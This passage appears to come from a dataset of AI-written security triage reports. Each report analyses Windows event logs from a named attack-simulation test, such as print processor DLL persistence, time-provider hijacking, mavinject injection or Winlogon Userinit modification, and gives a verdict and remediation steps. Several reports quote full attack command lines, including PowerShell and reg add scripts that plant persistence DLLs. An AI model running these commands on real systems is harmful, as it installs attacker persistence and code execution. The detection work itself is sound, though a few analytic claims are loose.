- **Process Execution Patterns**: There are extensive uses of legitimate system binaries (`powershell.exe`, `wevtutil.exe`, `conhost.exe`) usually observed during lateral movements or living off the land attacks. These can be used by attackers to mask malicious activity with legitimate processes. A process execution tree shows PowerShell executing `data.011_x64.exe`, which is atypical and a potential indicator of compromise.

#### 4. Windows PowerShell Log
The PowerShell logs evidence the execution of the aforementioned suspicious executable. The logs indicate provider start activities without any specific command details, which further corroborates possible malicious use of PowerShell without full logging (often indicative of execution of obfuscated or encoded malicious scripts).

### Assessment:
The pattern of behavior, such as executing PowerShell to run a temporary executable without metadata, and the repeated failed credential access attempts to a Microsoft Account, are strong indicators of a potential breach or unauthorized activity. The elevation of privileges via SYSTEM is not unusual but paired with the suspicious executable indicates possible privilege misuse.

### Conclusion:
**Resolution: MALICIOUS**

### Guidance and Next Steps:
- **Immediate Containment**: Isolate the affected host ""Server002"" to prevent any potential lateral movement or data exfiltration.
  
- **Detailed Threat Hunting**: Conduct further forensic analysis on `data.011_x64.exe` and explore network traffic for connections to potentially suspicious IPs or domains.

- **Remediation Measures**: Consider resetting user credentials and ensure all security patches and Microsoft Security Essentials on the system are up to date.

- **Monitoring and Alerts**: Set up enhanced monitoring and alerts for similar executable patterns and privilege escalation attempts to prevent recurrence.

- **Review Access Permissions**: Ensure service accounts and SYSTEM privileges are in accordance to the principle of least privilege.

Document and report findings to the incident response team for a coordinated investigation and response strategy."
Print Processors,"Based on the provided log entries, here’s a detailed analysis:

1. **Application Logs**:
   - The logs show normal operation of services such as Software Protection Platform Service and EdgeUpdate service. The ""Service stopped"" entries for EdgeUpdate seem benign, as they don't suggest anything malicious in themselves.

2. **Sysmon Logs**:
   - There are multiple events where `wevtutil.exe`, `conhost.exe`, and `whoami.exe` are executed by the user `SERVER002\admin_test`. These processes are legitimate but can be used for malicious purposes if misused. 
   - Anomalous activity is discernible in the following Sysmon event details concerning `powershell.exe`:
     ```
     ""CommandLine"":""\""powershell.exe\"" & {if( $(get-service -Name spooler).StartType -eq \""\""Disabled\""\"") {Set-Service -Name \""spooler\"" -StartupType Automatic}, net stop spooler, Copy-Item \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\fileTest.dll\"" C:\\Windows\\System32\\spool\\prtprocs\\x64\\fileTest.dll, reg add \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\file\"" /v \""Driver\"" /d \""fileTest.dll\"" /t REG_SZ /f, net start spooler, if(0){,   Restart-Computer, }}""
     ```
     - This script is modifying printer services and settings, copying a DLL which could be a potential indication of a DLL hijacking attempt. 

3. **Security Logs**:
   - Logs regarding the SYSTEM account illustrate privileged actions typically normal within a Windows environment. However, the privilege list includes several high-level privileges (e.g., SeDebugPrivilege, SeLoadDriverPrivilege) which, if misused, could potentially enable an attacker to execute or load malicious drivers.

4. **PowerShell Logs**:
   - They reinforce the evidence of a suspicious PowerShell activity where a script is altering printer configurations, indicating potentially malicious activity, further evidenced by the registry changes and DLL copy actions mentioned in the Sysmon log.

5. **System Logs**:
   - The common system behavior, with time settings and svchost.exe operations, does not appear malicious on its own.

**Assessment**:
The Sysmon and PowerShell logs indicate potentially malicious activity involving the execution of a PowerShell script that interacts with printer spooler settings and attempts to insert a DLL file in the spooler’s process path. This could signify an attempt at DLL hijacking or privilege escalation.

**Resolution**: **MALICIOUS**
- The logs contain evidence of likely malicious activity involving unauthorized changes to the system's printing subsystem, possibly intended to exploit vulnerabilities.

**Guidance**:
1. Investigate the source and intent of the PowerShell script and DLL file operations.
2. Conduct a deep forensic analysis to determine any further compromise or lateral movement within the network.
3. Audit credential use and review policies around service account privileges.
4. Apply patches or mitigations to address potential vulnerabilities related to print spooler service.
5. Consider isolating affected systems and conducting a complete malware scan and threat analysis."
Process Injection via mavinject.exe,"Upon analyzing the provided Windows event logs, certain patterns and events raise concerns indicating potential malicious activity. Here's the detailed analysis:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**:
   - Repeated execution of PowerShell scripts is observed, particularly using ""mavinject"" to inject a DLL into a process. The use of ""mavinject"" with PowerShell is highly suspicious as it can be used for DLL injection, a technique often used by attackers to run code within the context of another process. In this case, the execution `mavinject $mypid /INJECTRUNNING \""...\\data.001.dll\""` is used, which is not typical in normal PowerShell activity.

2. **Process Activity**:
   - Frequent creation of conhost.exe and wevtutil.exe processes. While these processes can be benign, conhost.exe is sometimes used to hide malicious activity since it acts as a console host.
   - The invocation of notepad.exe followed by its immediate process termination is an anomaly unless it's part of a legitimate script or administrative process.
   - Execution of commands like `wevtutil epl Microsoft-Windows-Sysmon/Operational ...` which could be used to export event logs. While such actions can be routine during operations like log management, combined with other activities suggests possible log tampering or cover-up actions after malicious actions.

3. **File Paths and Commands**:
   - The suspicious command line involving PowerShell shows a potential attempt to use a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\x64\data.001.dll` for DLL storage and injection, which is not typical for administrative or benign activity.
   
4. **Privilege Level and User Profile**:
   - Most events indicate actions performed under a ""High"" integrity level, which means high privilege. The account ""SERVER002\admin_test"" seems to be heavily involved, which requires further examination to confirm whether these actions were expected or authorized.

5. **System and Security Logs**:
   - Absence of entries in some logs raises a question mark. It can indicate potential log clearance or filtering activity which might have been employed to evade detection.

### Assessment and Resolution:
- The behavior, particularly around the use of PowerShell and ""mavinject"" for process injection and the manipulation of notepad and other system utilities, is characteristic of malicious intent.
- DLL injection into processes along with actions that could potentially alter security logs point towards clear signs of a breach attempt or ongoing compromise.

### Final Analysis Resolution:
**MALICIOUS** - The logs contain definitive signs of malicious activity, particularly due to the suspicious use of PowerShell for DLL injection and potential log tampering. Immediate action is recommended to isolate the affected system, conduct a full security audit, and implement incident response procedures.

### Guidance on How to Proceed:
1. **Isolate the Host**: Immediately isolate the server from the network to prevent further malicious activity.
2. **Conduct a Thorough Investigation**: Perform deep scanning for malware or backdoor presence, especially focusing on typical payload areas, Temp directories, and registry keys.
3. **Review User Activity**: Investigate the actions and access patterns for the account ""SERVER002\admin_test"" to determine if it was compromised.
4. **Incident Response**: Engage incident response teams to apply the necessary controls, patches, and conduct a full post-incident review to seal security gaps.
5. **Log Analysis and Archival**: Ensure logs are complete, intact, and securely stored for potential legal or forensic needs in the future.
6. **Continuous Monitoring**: Increase monitoring on all systems, emphasizing privilege use and process injection activities to promptly detect similar occurrences. 

By implementing these actions, you can mitigate immediate threats and establish stronger defenses against future incidents."
Azure AD - Add Company Administrator Role to a user,"Upon reviewing the provided Windows event logs, several activities stand out as potentially suspicious:

1. **PowerShell Activity:**
    - A PowerShell command executes complex automation involving the import of the MSOnline module and a series of administrative actions such as setting credentials and adding a Company Administrator role. Such actions:
        - `powershell.exe & {Import-Module MSOnline ...`
        - Usage of sensitive credentials (`jonh@contoso.com`) scripted and secured in plain text form.
        - The whole command structure indicates the script was likely intended to automate management or administrative tasks which could be considered risky if unauthorized.
    - Another PowerShell command: `powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; ...` involves file inspection and possible system enumeration which can be a symptom of post-compromise reconnaissance.

2. **Sysmon Logs:**
    - Execution of PowerShell instances and other related processes (`hostname.exe`, `whoami.exe`) under high integrity levels and a privileged account (`SERVER002\\admin_test`), executed in rapid succession.
    - Many instances of `conhost.exe` appearing along with `powershell.exe`, which could suggest process hooking or the opening of console windows often seen in automated script execution or layered malware activity.
    - Execution of `wsmprovhost.exe` and multiple CLI commands under a high integrity level (indicative of the potential for privilege abuse).

3. **Suspicious Patterns:**
    - The apparent scripting and automation practices, especially with administrative credential usages, indicate the possibility of a security boundary being tested or actively exploited.
    - Usage of `whoami.exe` and variable manipulations were observed, which can suit both legitimate scripting requirements and attack methodologies where understanding execution context is critical.

4. **Update Client Logs:**
    - The Microsoft.WindowsUpdateClient logs seem typical of a system performing routine updates and don't directly correlate with any suspicious activities.

### Conclusion:
Given the combination of detailed administrative script execution in PowerShell and potentially malicious scripting symptoms, along with high-level utilization in Sysmon logs and credential handling, the situation can be classified as:

- **SUSPICIOUS**

### Guidance:
- Confirm whether this activity was authorized by system or administrative staff. Verify if the script conforms to known automate systems management scheduled tasks and is executed by a trusted entity.
- Review the legitimacy of the email credentials and account management operations observed in the PowerShell commands.
- Elevate to full incident response protocols if the activity is not scheduled or recognized as part of standard operations within the organization.
- Ensure system and log integrity going forward to watch for additional activities and understand any related changes to roles or permissions."
Persistence by modifying Windows Terminal profile,"Upon analyzing the provided Windows event logs, several observations and considerations have been made:

**Suspicious Events:**

1. **Powershell Activity:**
   - The execution of `powershell.exe` with command line containing `Invoke-WebRequest` with a URL pointing to a GitHub repository is unusual and could be suspicious. This is often seen in scripts that download and execute remote files. The execution of PowerShell with potentially harmful command-line arguments indicates possible malicious intent.

2. **Frequent Use of `wevtutil.exe`:**
   - The `wevtutil.exe` process is frequently executed by the `SERVER002\admin_test` user. While this tool is typically used for managing event logs, its frequent execution in a short span alongside the use of PowerShell script suggests a potential attempt to tamper with or export logs for malicious purposes.
  
3. **Execution Timeline:**
   - The very rapid sequence and execution of these processes (within seconds) potentially indicate automated script execution rather than normal user activity.
   
4. **Use of `conhost.exe`:**
   - In the logs, `conhost.exe` is associated with several process executions which are legitimate as it often facilitates command prompt operations. However, its persistent appearance in conjunction with unusual operations could be part of simulating a legitimate process tree or redirecting input/output for script execution.

5. **Process Owner and Integrity Level:**
   - All suspicious activities are performed under `SERVER002\admin_test` with high integrity levels. This suggests the use of administrative privileges, typical in scenarios involving privilege escalation.

**Assessment Summary and Potential Risks:**

- **Malicious Activity Detected:** 
  - The combination of PowerShell being used to download files from an external network and the accompanying sequence of tool executions strongly points to suspicious activity typical of adversaries.
  - There is potential for data exfiltration, log manipulation, and unauthorized system changes.
  
**Guidance on How to Proceed:**

1. **Isolation and Investigation:**
   - Isolate the affected host `Server002` to prevent further potential malicious activity.
   - Conduct a forensic analysis of the system, focusing on downloaded files and PowerShell scripts used.

2. **Review and Rollback Changes:**
   - Analyze the PowerShell script and downloaded files for any changes it may have executed. If possible, roll back unauthorized changes.

3. **Log Management:**
   - Review and restore event logs in case of unauthorized deletions or tampering by `wevtutil.exe`.

4. **Credential and Access Review:**
   - Review and possibly reset credentials associated with `SERVER002\admin_test`.
   - Increase monitoring on similar systems and accounts for unusual activity.

5. **Security Measure Reinforcement:**
   - Implement or reinforce security measures such as application whitelisting for PowerShell usage, enhanced logging, and network monitoring for outbound connections to unfamiliar domains.

**Resolution:**
- **MALICIOUS:** The series of events collectively warrant classification as malicious due to the clear indication of a potential compromise involving the use of PowerShell to execute scripts that could harm the system. Immediate action is advised to contain and mitigate the threat."
Add Port Monitor persistence in Registry,"Upon review of the provided Windows event logs, the following analysis identifies potentially suspicious behaviors:

**Suspicious or Anomalous Behavior:**

1. **Registry Modification Attempts**:
   - There is a `cmd.exe` execution with a command-line argument that attempts to modify the Windows registry (`reg add`) with a `PortMonitor.dll` file located in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.010\\bin\\PortMonitor.dll`). This is suspicious because:
     - It involves registry keys related to print monitors, which are often targeted by malware.
     - The DLL location in a user temp directory can indicate a malicious payload was delivered and is attempting to maintain persistence or escalate privileges.

2. **Frequent Execution of System Utilities**:
   - Processes like `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are executed frequently in a short span of time, under the user `SERVER002\\admin_test` with high integrity levels. This repetitive and high-privilege execution could be indicative of:
     - An administrator or script running commands for legitimate maintenance or monitoring purposes.
     - A malicious actor enumerating system configurations and clearing or gathering event logs.

**Indicators of Potential Malicious Activity:**

- The use of native utilities like `cmd.exe` for obscure registry editing is a common tactic in malware attacks to bypass traditional security measures.
- The process sequence indicates an attempt to introduce potential persistence mechanisms via the system's registry, often used by malware to ensure it continues to run on startup or after reboots.

**Assessment of the Situation:**
- The activities and sequences in the logs, particularly involving command and registry access via high-integrity processes, suggest a strong indicator of compromise rather than regular administrative activity. The specific use of a temporary directory and obscure registry keys for hooking persists to common malware tactics.

**Threats or Risks Identified:**
- Potential malware attempting persistence through registry modifications.
- Possible unauthorized access or compromise of a privileged account (`admin_test`).

**Guidance on How to Proceed:**
1. **Immediate Actions**:
   - Isolate the affected machine from the network to prevent potential spread.
   - Change and secure the credentials for `SERVER002\\admin_test` and other privileged accounts.
   
2. **Further Investigation**:
   - Perform a detailed forensic analysis of the system to trace the source and full scope of compromise.
   - Analyze associated network traffic for signs of data exfiltration or additional compromise activities.
   - Verify and clean the system’s registry and startup processes to remove potential malicious entries.

3. **Post-Incident Actions**:
   - Implement enhanced endpoint monitoring and logging to capture similar suspicious activities in the future.
   - Conduct a security review and hardening of user accounts and system configurations.

Based on the deep analysis of the logs, the resolution is classified as **MALICIOUS**."
Azure - adding service principal to Azure role in subscription,"Upon analyzing the provided Windows event logs, several aspects stand out:

### Windows PowerShell Log

- The PowerShell log entries reflect the execution of a script that involves Azure PowerShell commands. The script imports the `Az.Resources` module, creates a PSCredential object with a plaintext password (though converted to a secure string), and attempts to connect to an Azure account using these credentials. Subsequently, it searches for an Azure Active Directory service principal and a subscription, then assigns the ""Reader"" role to the service principal.
  
- **Concerns:**
  - Scripts handling credentials and role assignments, especially involving plaintext passwords, are highly sensitive operations and can be potential security risks if not properly secured.
  - The presence of a hardcoded password and script-based access modification in Azure environments may indicate either a poorly constructed administrative script or an unauthorized attempt to manipulate access in the Azure environment.

### Security Log

- The security log shows repeated EventID 4798, indicating enumerations of user accounts on the system. This activity is conducted by `CompatTelRunner.exe`, typically a telemetry component.
  
- **Concerns:**
  - Repeated enumeration of user accounts, especially through a system process like CompatTelRunner, might be benign or related to legitimate telemetry, but it's uncommon for such telemetry components to frequently enumerate local accounts.
  - If the behavior of CompatTelRunner deviates from expected patterns or timelines, this activity might warrant further investigation.

### Sysmon Log

- The Sysmon logs capture the creation of `wevtutil.exe` and other processes by the user `admin_test`, indicating potential event log querying or clearing activities. The account `admin_test` is also associated with other PowerShell and utility processes during the timeframe.
  
- **Concerns:**
  - PowerShell and utilities such as `wevtutil.exe` are often misused in malicious scenarios for querying, manipulating, or clearing logs. However, alone this data is not sufficient to definitively classify it as malicious without context.
  - The combination of activities surrounding `admin_test` suggests intentional interaction with system and administrative tools, which could be normal administrative maintenance or suspicious behavior.

### Assessment

- **Potential risks identified:** The usage of plaintext passwords, PowerShell scripts for sensitive operations, and account enumeration through system components could indicate either benign administrative scripting with security oversights or the preparatory work of a more targeted attempt to compromise system components.

### Resolution

- **SUSPICIOUS:** Although no explicit malicious activity or malware signals are apparent, activities observed could potentially lead to malicious actions if not verified as legitimate administrative operations. Further investigation is advised to determine:
  - The legitimacy of the PowerShell scripts and the presence of any documentation or authorization for such operations.
  - The validity and behavior of the account enumeration by CompatTelRunner within the context of known telemetry operations.
  - Confirmation if the involved accounts (`admin_test` and others that are subject to enumeration) are aware or responsible for these activities.
"
TinyTurla backdoor service w64time,"Upon reviewing the provided Windows event logs, there are several key observations indicating potentially malicious activity on the system. Let's break it down by events and analysis:

### Suspicious and Anomalous Behavior:
1. **Time Change Events (EventID: 4616)**:
   - The system time is being manipulated, as recorded in the security and system logs. This is notable because time adjustments are often employed by malicious actors to erase or alter time-based forensic evidence. 
   - There are consecutive time changes (from `12:55:31` to `12:55:25`) which warrant further scrutiny.

2. **High Privilege Activities (EventID: 4672)**:
   - Privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeTakeOwnershipPrivilege` were assigned to the user `admin_test` at `12:55:25`. Such privileges can allow process manipulation and data access which are typically tied to administrative activity or potential abuse.

3. **Logon Events (EventID: 4624 and 4634)**:
   - Multiple logons using `NTLM` and repeated logon sessions in close succession are noted for the user `admin_test`. This pattern may indicate either admin activity or suspicious account usage, especially across such a short time span.

4. **Service Creation and Configuration (Sysmon EventID: 1 and 5)**:
   - The command `cmd.exe` was used to execute a series of service creation and configuration commands which are out of the ordinary for routine operations:
     - File `w64time.dll` was copied, and a new service `W64Time` was created.
     - Registry keys were manipulated to incorporate this new service.
   - This pattern aligns with an attempt to create a persistence mechanism or install a backdoor on the system.

5. **Execution of Administrative Commands**:
   - Execution of management utilities like `wevtutil.exe` and services setup using `sc.exe` without an apparent legitimate administrative purpose could suggest a form of unauthorized control activity.

6. **Command Line Executions**:
   - Use of command line tools and registry modification (`reg.exe`) seems automated or script-driven rather than manual sysadmin tasks, pointing towards scripted attack patterns.

### Suspicious Indicators:
- The sequence of events and activities involving privilege escalation, time manipulation, and service creation reflect typical malicious techniques seen in targeted and automated attacks, such as those from advanced persistent threat actors.
- Service creation and configuration involving `w64time.dll` and use of the network to convey or instantiate a new unrecognized time service are red flags.

### Assessment:
- **Resolution**: **MALICIOUS**
- Given the nature of the executed activities, this evaluation leans heavily towards a high probability of compromise occurring or attempted on the system in question. The evidence suggests potential malicious behavior given the unauthorized privilege escalation, tampering with system time, dubious service creation, and service backdooring techniques.

### Guidance:
- **Immediate Actions**: 
  - Conduct a comprehensive security audit of the affected host and neighboring systems to identify any lateral movement or other instances of this behavior.
  - Isolate the affected host from the network to prevent potential propagation.
  - Analyze network traffic logs for data exfiltration indicators and unexpected outgoing communications.
- **Further Investigation**:
  - Review any external IP addresses noted in logs for blacklisting or known threat actor associations.
  - Perform a deep inspection of `w64time.dll` and any modifications made within `\System32`.
  - Conduct endpoint detection scans across the network for similar patterns.

This understanding will help in promptly mitigating the potential threat and reinforcing security controls to prevent recurrence."
Create shortcut to cmd in startup folders,"### Analysis of Log Entries:

1. **PowerShell Activity**: 
   - There is notable PowerShell activity where scripts were executed with a command to create shortcuts in the startup directory, with `cmd.exe` as the target path. The creation of shortcuts in startup folders is often related to persistence mechanisms used by malware to ensure execution upon system boot. This activity is suspicious.
   - The command used within the PowerShell scripts seems to be both targeting `APPDATA` and `ProgramData` paths to create these shortcuts. This kind of behavior can be indicative of malicious scripts trying to maintain persistence by running a shell command on every user login.

2. **Sysmon Log Observations**:
   - Multiple executions of `whoami.exe`, `hostname.exe`, `powershell.exe`, and `conhost.exe` are seen which by themselves are not typically suspicious. However, the PowerShell instance is noteworthy due to its command line as mentioned above.
   - Process creation sequences show high integrity level processes running under the user `SERVER002\\admin_test`, which could indicate logs are from an admin session. However, the PowerShell script achieves unauthorized persistence.

3. **Software Activity**:
   - Multiple entries related to `MicrosoftEdgeUpdate.exe` and its components executing, which looks like regular browser update activity. However, verifying this is standard update procedure would ensure there's no software supply-chain issue or misuse.

4. **Kernel and Time Adjustments**:
   - There are events related to time changes done by the system (`svchost.exe`). These appear benign as part of regular time synchronization processes but should be verified.

5. **Service Stops**:
   - The `edgeupdate` service stopped entries can indicate service-related modifications, but within the logs, this action looks benign contingent upon a legitimate update installation or system health check.

### Suspicious Behavior and Indicators:

- The execution of a PowerShell script to manipulate startup items for persistence is highly suspicious and indicative of potentially malicious intent.
- PowerShell's HostApplication indicates specialized scripts which can be used for persistent threats, notably by setting Windows shortcuts to open command prompts automatically, thus suggesting potential backdoor setup.
   
### Assessment:

- **Resolution**: **MALICIOUS**
  
  The PowerShell script's behavior strongly indicates an attempt to gain persistence on the affected system by invoking `cmd.exe` on startup, a method commonly used by malware. This behavior necessitates immediate attention as it could lead to further exploitation or malicious activities.

### Guidance:

1. **Immediate Actions**:
   - Isolate the affected system from the network to prevent any propagation or further access until a full investigation is concluded.
   - Remove the created shortcuts from the startup directories to prevent further execution of potentially harmful commands.
   - Run a comprehensive antivirus and anti-malware scan to detect and remediate any known threats.
   - Review user access rights, especially for the accounts involved (`SERVER002\\admin_test`).

2. **Investigation**:
   - Conduct a thorough review of executed scripts and commands outside of these logs within this period to ensure no other compromised scripts ran.
   - Check for any other modifications or files located in suspicious directories.
   - Contact any involved security teams or OEMs for a detailed threat analysis or insights into similar malicious behavior patterns.

3. **Long-term Actions**:
   - Strengthen endpoint protection and monitoring for abnormal script executions and ensure integrity checks are in place.
   - Bolster the security awareness among users to prevent and promptly report suspicious activities.
   - Regularly update and patch systems to prevent exploitation of known vulnerabilities by malware."
Edit an existing time provider,"Based on a thorough analysis of the provided Windows event logs, the following findings have been identified:

### Suspicious and Potentially Malicious Activities:

1. **Unauthorized PowerShell Activity**:
   - There is a PowerShell command that involves stopping the `w32time` service, copying a DLL (`fileTest.dll`) into a public directory, modifying registry keys related to the `NtpServer`, and restarting the `w32time` service. 
   - Command Used:
     ```powershell
     net stop w32time
     Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileTest.dll"" C:\Users\Public\fileTest.dll
     reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\fileTest.dll"" /f
     reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
     reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
     net start w32time
     ```
   - This script showcases signs of a potential attempt to introduce a malicious DLL into the system’s time service. Loading a custom DLL in such a manner can indicate a serious security risk, especially if it's aimed to intercept or manipulate time-based operations on the server.

2. **Registry Modifications and DLL Injection**:
   - Multiple logs confirm registry modifications to enable an untrusted DLL as a time provider, which is highly suspicious and often indicated in attacks to maintain persistence or stealth.

3. **Time Adjustments**:
   - There are security events (`EventID 4616`) indicating changes in system time by the `svchost.exe` process. Although there might be legitimate cases for time changes, coupled with the registry modifications and DLL copy operations, it adds to the suspicion level.

4. **Processes Executing with High Integrity Levels**:
   - Critical processes, including several instances of `wevtutil.exe`, `conhost.exe`, and `hostname.exe`, are executed by the user `SERVER002\admin_test` with high integrity, indicative of potentially unauthorized use of elevated privileges, though not inherently malicious without other supporting evidence.

### Assessment:

Given the data above, there is strong evidence of **malicious activity** based on the PowerShell command executed and the subsequent system modifications aiming to persist a potentially harmful DLL. The actions observed are consistent with attempts to achieve persistence or stealthy operation, likely pointing to a compromised system state.

### Resolution:

The provided Windows event logs indicate **MALICIOUS** activity.

### Guidance on How to Proceed:

1. **Isolate Affected System**: Immediately isolate `Server002` from the network to prevent further potential spread or impact of the threat.

2. **Conduct a Thorough Investigation**:
   - Perform a detailed forensic analysis to understand the scope of the compromise.
   - Check for any unauthorized or suspicious accounts and access patterns.

3. **Review and Clean up**:
   - Remove any unauthorized DLLs, as well as any unwanted registry changes, particularly those concerning the `W32Time` service.
   - Validate the integrity of system binaries, especially those involved in the modifications.

4. **Strengthen Security Posture**:
   - Ensure all systems are fully patched, particularly routine inspection for similar unauthorized actions across other servers.
   - Update and enable logging to capture detailed PowerShell operations (enable command line auditing).

5. **Educate and Prepare**:
   - Conduct awareness training highlighting unauthorized and potentially harmful uses of PowerShell.
   - Implement better access control policies, especially regarding administrative tools and capabilities."
Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,"### Detailed Analysis:

#### Sysmon Logs:
1. **Edge Update Events**: There are several entries regarding the execution of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` under the `NT AUTHORITY\SYSTEM` account. These are legitimate processes associated with updating Microsoft Edge, indicating that updates were likely being performed. No anomalous behavior detected in these entries.

2. **Wevtutil.exe Executions**: The `wevtutil.exe` event log clearing utility was executed multiple times by `SERVER002\admin_test` with high integrity level. While the utility itself is legitimate, repeated or unexplained clearing of event logs can be associated with malicious activity attempting to cover its tracks.

3. **Whoami Executions**: Several instances of `whoami.exe` executed by `SERVER002\admin_test`. The use of `whoami` is a typical command to check user identity but can also indicate privilege verification during post-exploitation activities.

4. **Powershell Activity**: Execution of PowerShell with suspicious commands was detected:
   - Modifying registry keys related to `Security Packages` and setting a new value to `AtomicTest.dll` indicates potential unauthorized actions to introduce an unusual DLL into the security packages list. This is indicative of an attack pattern where attackers try to load malicious DLLs for persistence or privilege escalation.

#### Windows PowerShell Logs:
- The PowerShell events indicate the execution of commands related to modifying registry values of `Security Packages`. The changes attempt to insert `AtomicTest.dll`, further reinforcing the evidence of suspicious activity gleaned from Sysmon logs.

#### System Logs:
- There are events indicating the clearing of logs in the `System` and `Windows PowerShell` channels by `admin_test`. This action can be suspicious if not justified by legitimate administrative processes, as it may indicate attempts to hide malicious activity.

#### Security Logs:
- Event ID 1102 reveals the clearing of the Security log by `admin_test`, a potentially serious indication of log tampering and covers tracks after performing unauthorized activities.

#### Application Logs:
- Normal activity related to application logs, though limited and devoid of any additional details that would relate to the malicious behavior identified elsewhere.

### Assessment:
Based on the logs reviewed, there are several indicators of suspicious, potentially malicious behavior:
- Execution of `PowerShell` with commands altering the `Security Packages` registry key.
- Repeated and unexplained use of `wevtutil.exe` to clear logs.
- The clearing of logs by `admin_test` in both System and Security logs.

### Resolution:
- **MALICIOUS**: The combination of PowerShell script activity with attempts to modify critical security registry settings and the subsequent clearing of logs aligned with known malicious tactics. These actions match patterns common in unauthorized system alterations or persistence mechanisms by attackers.

### Guidance on How to Proceed:
1. **Immediate Investigation**: Conduct a thorough investigation on `SERVER002` to determine the exact changes made and assess potential impacts.
2. **Isolate the System**: If not already, isolate the affected system to prevent further compromise or data exfiltration.
3. **Review User Activity and Access**: Investigate the activities of `admin_test` and validate if any unauthorized access or misuse occurred.
4. **Reverse Changes**: Revert any unauthorized registry changes to restore normal security configurations.
5. **Implement Monitoring and Alerts**: Set up monitoring for similar activities or patterns to alert on potential attacks promptly.
6. **Conduct Incident Response**: Engage your incident response team to handle the situation in accordance with your organization's protocol.

Appropriate actions should be taken to ensure network security is maintained and potential attacker access is revoked."
HKLM - Append Command to Winlogon Userinit KEY Value,"## Detailed Analysis of Logs

Upon thorough examination of the provided Windows event logs, several entries stand out as potentially suspicious:

### Windows PowerShell Log Analysis

The PowerShell logs show a series of commands being executed with significant implications:
- **Command Log:** All PowerShell events (Event IDs 1043 to 1049) show the execution of a PowerShell script that modifies the Windows Registry key for ""Userinit"" at `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`. The script appends `""C:\Windows\System32\calc.exe""` to the existing ""Userinit"" registry value.
- **Behavioral Analysis:** This modification is not typical for legitimate administrative actions as it can be used for persistence techniques by attackers. The action is to ensure that `calc.exe` runs automatically upon user login, which fits a pattern of suspicious behavior commonly associated with malicious activity or unauthorized persistence mechanisms.

### Sysmon Log Analysis

- **Process Execution:** There are multiple executions of processes like `wevtutil.exe` and `conhost.exe` under the `SERVER002\admin_test` account. While these may not stand out as inherently malicious, they are worth noting when seeing in conjunction with other suspicious behavior, particularly if these actions are not part of an expected pattern for this user or role.
- **Different Processes:** The creation of PowerShell processes with command lines that modify critical registry settings further corroborates suspicious activity.

### Overall Suspicion

The activity captured, especially the registry modification to include the execution of `calc.exe` during user logon, strongly suggests an attempt for persistence by executing benign-looking utilities to mask potentially malicious behavior. Such modifications are frequently leveraged in attack scenarios to run hidden or backdoor processes masquerading as legitimate binaries.

## Assessment

### Threats/Risks Identified

- **Registry Modification for Persistence:** The modification of the registry to run additional processes on user login is potentially an advanced tactic used for maintaining access or running unwanted code upon system startup.
- **Potential Unauthorized Access**: This behavior can indicate a foothold by an unauthorized entity as it signifies tampering with critical system startup processes.

## Resolution

Given the evidence of registry manipulation and the potentially unauthorized usage of PowerShell for persistence, I would categorize these actions as:

**Resolution: MALICIOUS**

The activities observed are consistent with known malicious tactics employed for persistence, often used by adversaries to maintain access to a system after initial compromise. Immediate remediation steps are recommended.

## Guidance on How to Proceed

- **Immediate Investigation:** Conduct an in-depth investigation into the actions taken by the `SERVER002\admin_test` account to determine if it was compromised.
  
- **Registry Monitoring and Restoration:** Restore registry entries to default values and ensure no unauthorized startup commands persist.

- **Endpoint Review:** Review endpoint logs and conduct threat hunting to identify any further signs of compromise or associated malicious activity.

- **Access Control Review:** Assess the access privileges of the involved accounts and adjust to minimize future risk exposure.

- **Reinforcement of Security Controls:** Enhance monitoring on similar changes across Windows hosts, especially PowerShell usage, registry key modifications, and the actions of privileged accounts.

- **Audit Trail Preservation:** Ensure logs and associated data are preserved as part of the ongoing investigation and for potential incident response actions."
Azure AD Application Hijacking - Service Principal,"Upon reviewing the provided Windows event logs, I have identified several events and behaviors that indicate potential malicious activity. Below is a detailed analysis based on the logs:

### PowerShell Logs
1. **PowerShell Script Execution**: The PowerShell logs show a script being executed on `Server002` that is performing several potentially suspicious activities:
   - Importing AzureAD module and attempting to connect to AzureAD with a hardcoded password (`p4sswd`), which is converted to a secure string.
   - Searching for a service principal (`SuperSP`); if not found, it writes a warning and exits, suggesting an attempt to enumerate Azure resources.
   - Creating a self-signed certificate and using it to add a new key credential to the AzureAD service principal, indicating potential unauthorized access or persistence in AzureAD.
   - The script comments suggest it is creating a short-term backdoor meant to last for a day, which is a tactic often used by attackers to maintain access while minimizing detection risk.
   - Notably, it concludes with logging into AzureAD using the certificate, indicating a successful privilege escalation or application hijacking.

2. **Suspicious Messaging**:
   - The script contains comments and messages like ""Application Hijacking worked. Logged in successfully..."", which are indicative of testing or unauthorized activities.

### Sysmon Logs
1. **Process Creation Logs**: Sysmon logs capture several instances of PowerShell and other utility usage.
   - `powershell.exe` and `wevtutil.exe` processes are initiated by the user `SERVER002\admin_test`.
   - The process command lines are complex and indicative of script execution, not typical administrative use or standard operation.
   - `wevtutil.exe` is used to export logs, which can be a sign of activities aimed at hiding evidence or log tampering.

2. **Use of Tools and High Integrity Level**:
   - `whoami.exe` and `hostname.exe` are executed with high integrity levels, indicating potential privilege escalation or information gathering.

### Assessment and Resolution

